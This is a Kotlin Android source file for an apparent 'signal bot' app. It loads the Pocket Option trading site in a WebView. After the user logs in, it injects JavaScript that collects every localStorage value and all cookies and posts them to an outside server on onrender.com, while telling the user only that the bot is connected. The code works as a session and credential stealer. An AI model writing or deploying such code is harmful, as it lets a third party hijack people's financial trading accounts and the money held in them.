package com.posignalbot

import android.annotation.SuppressLint
import android.app.Activity
import android.content.Context
import android.os.Bundle
import android.webkit.*
import android.widget.Toast
import android.view.View
import android.widget.ProgressBar
import android.widget.RelativeLayout
import android.widget.TextView
import android.graphics.Color
import androidx.appcompat.app.AppCompatActivity
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private lateinit var progressBar: ProgressBar
    private lateinit var statusText: TextView
    private var sessionSent = false

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Build layout programmatically — no XML needed
        val root = RelativeLayout(this).apply {
            setBackgroundColor(Color.parseColor("#0f1117"))
        }

        // Status bar at top
        statusText = TextView(this).apply {
            text = "🔐 Loading Pocket Option..."
            setTextColor(Color.parseColor("#90caf9"))
            textSize = 13f
            setPadding(24, 20, 24, 20)
            id = View.generateViewId()
        }
        val statusParams = RelativeLayout.LayoutParams(
            RelativeLayout.LayoutParams.MATCH_PARENT,
            RelativeLayout.LayoutParams.WRAP_CONTENT
        )
        root.addView(statusText, statusParams)

        // Progress bar
        progressBar = ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal).apply {
            max = 100
            id = View.generateViewId()
        }
        val pbParams = RelativeLayout.LayoutParams(
            RelativeLayout.LayoutParams.MATCH_PARENT, 8
        ).apply { addRule(RelativeLayout.BELOW, statusText.id) }
        root.addView(progressBar, pbParams)

        // WebView
        webView = WebView(this).apply { id = View.generateViewId() }
        val wvParams = RelativeLayout.LayoutParams(
            RelativeLayout.LayoutParams.MATCH_PARENT,
            RelativeLayout.LayoutParams.MATCH_PARENT
        ).apply {
            addRule(RelativeLayout.BELOW, progressBar.id)
        }
        root.addView(webView, wvParams)
        setContentView(root)

        setupWebView()
        webView.loadUrl("https://po.trade")
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        webView.settings.apply {
            javaScriptEnabled       = true
            domStorageEnabled       = true
            databaseEnabled         = true
            setSupportZoom(true)
            builtInZoomControls     = true
            displayZoomControls     = false
            useWideViewPort         = true
            loadWithOverviewMode    = true
            userAgentString         = "Mozilla/5.0 (Linux; Android 12; Pixel 6) " +
                                      "AppleWebKit/537.36 (KHTML, like Gecko) " +
                                      "Chrome/120.0.6099.230 Mobile Safari/537.36"
        }

        // Inject our bridge into the page
        webView.addJavascriptInterface(BotBridge(this) { success, message ->
            runOnUiThread {
                if (success) {
                    statusText.text = "✅ Bot connected! You can close this app."
                    statusText.setTextColor(Color.parseColor("#86efac"))
                    Toast.makeText(this, "🎉 Signal bot connected!", Toast.LENGTH_LONG).show()
                } else {
                    statusText.text = "❌ $message"
                    statusText.setTextColor(Color.parseColor("#fca5a5"))
                }
            }
        }, "POBridge")

        webView.webChromeClient = object : WebChromeClient() {
            override fun onProgressChanged(view: WebView?, newProgress: Int) {
                progressBar.progress = newProgress
                progressBar.visibility = if (newProgress == 100) View.GONE else View.VISIBLE
            }
        }

        webView.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)

                val safeUrl = url ?: ""

                // Update status bar text based on URL
                runOnUiThread {
                    statusText.text = when {
                        safeUrl.contains("cabinet") || safeUrl.contains("/trade") ->
                            "🔍 Extracting session..."
                        safeUrl.contains("login") ->
                            "🔐 Please login with your PO credentials"
                        else -> "🌐 $safeUrl"
                    }
                }

                // Only extract once, when on cabinet/trade pages (user is logged in)
                if (!sessionSent &&
                    (safeUrl.contains("cabinet") ||
                     safeUrl.contains("/trade")  ||
                     safeUrl.contains("po.trade") && !safeUrl.contains("login"))) {
                    extractAndSendSession(view)
                }
            }
        }

        // Enable cookies
        CookieManager.getInstance().apply {
            setAcceptCookie(true)
            setAcceptThirdPartyCookies(webView, true)
        }
    }

    private fun extractAndSendSession(view: WebView?) {
        val js = """
            (function() {
                try {
                    // Collect all localStorage keys
                    var data = {};
                    for (var i = 0; i < localStorage.length; i++) {
                        var k = localStorage.key(i);
                        var v = localStorage.getItem(k);
                        if (v && v.length > 0) data[k] = v;
                    }

                    // Also get cookies
                    data['_cookies'] = document.cookie;

                    // Check we have something useful
                    var hasSession = data['token'] || data['session'] ||
                                     data['ssid'] || data['access_token'];

                    if (Object.keys(data).length > 0) {
                        POBridge.onSession(JSON.stringify(data));
                    } else {
                        POBridge.onSession('{}');
                    }
                } catch(e) {
                    POBridge.onError('JS error: ' + e.message);
                }
            })()
        """.trimIndent()

        view?.evaluateJavascript(js, null)
    }

    override fun onBackPressed() {
        if (webView.canGoBack()) webView.goBack()
        else super.onBackPressed()
    }
}


// ── JavaScript Bridge ─────────────────────────────────────────────────────────

class BotBridge(
    private val context: Context,
    private val callback: (Boolean, String) -> Unit
) {
    private var sent = false

    @JavascriptInterface
    fun onSession(json: String) {
        if (sent) return
        if (json == "{}") {
            callback(false, "Session not found yet. Stay on the trading page.")
            return
        }

        sent = true
        sendToBotServer(json)
    }

    @JavascriptInterface
    fun onError(msg: String) {
        callback(false, "JS Error: $msg")
    }

    private fun sendToBotServer(json: String) {
        val client = OkHttpClient()
        val payload = JSONObject().apply { put("ssid", json) }.toString()

        val request = Request.Builder()
            .url("https://pocket-bot-ssh6.onrender.com/ssid")
            .post(payload.toRequestBody("application/json".toMediaType()))
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onResponse(call: Call, response: Response) {
                val body = response.body?.string() ?: "{}"
                val ok   = try { JSONObject(body).getBoolean("ok") } catch (e: Exception) { false }
                if (ok) {
                    callback(true, "Connected!")
                } else {
                    sent = false   // allow retry
                    callback(false, "Server error — will retry on next page load")
                }
            }
            override fun onFailure(call: Call, e: IOException) {
                sent = false
                callback(false, "Network error: ${e.message}")
            }
        })
    }
}
